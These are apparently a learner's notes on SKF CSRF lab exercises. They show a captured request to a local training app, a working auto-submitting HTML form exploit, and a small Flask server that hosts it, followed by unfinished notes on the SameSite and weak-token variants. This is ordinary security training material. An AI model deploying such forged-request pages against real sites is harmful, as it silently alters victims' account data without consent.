## [csrf-skf-python](https://skf.gitbook.io/asvs-write-ups/csrf/csrf)
# let's Practice
- login  and select your favorite color
- see packets in the burp 
- and find csrf point 
```http
POST /update HTTP/1.1
Host: 127.0.0.1:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://127.0.0.1:5000
Connection: keep-alive
Referer: http://127.0.0.1:5000/login
Cookie: session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcklkIjoxfQ.Z4l8-g.OHX5GkIYn0OJR6zfbtjuJicQ7kE
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

color=green
```
- we have all Conditions for csrf
	- used cookie 
	- simple http request
	- not csrf token
- generate html code for exploiting 
```html
<html>
  <body>
    <form action="http://127.0.0.1:5000/update" method="POST">
      <input type="hidden" name="color" value="you hacked" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

```python
from flask import Flask, request, url_for, render_template, redirect, make_response
import requests


app = Flask(__name__, static_url_path='/static', static_folder='static')

app.config['DEBUG'] = True

@app.route("/")
def start():
    return render_template("evil.html")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
```

- when we visit page should redirect 127.0.0.1:5000/update 
- and see you hacked


# [Practice](https://skf.gitbook.io/asvs-write-ups/csrf-samesite/csrf-samesite)
not worked same site ..


# [Practice](https://skf.gitbook.io/asvs-write-ups/csrf-weak/csrf-weak)  csrf-token weak


# I don't know  now this type csrf
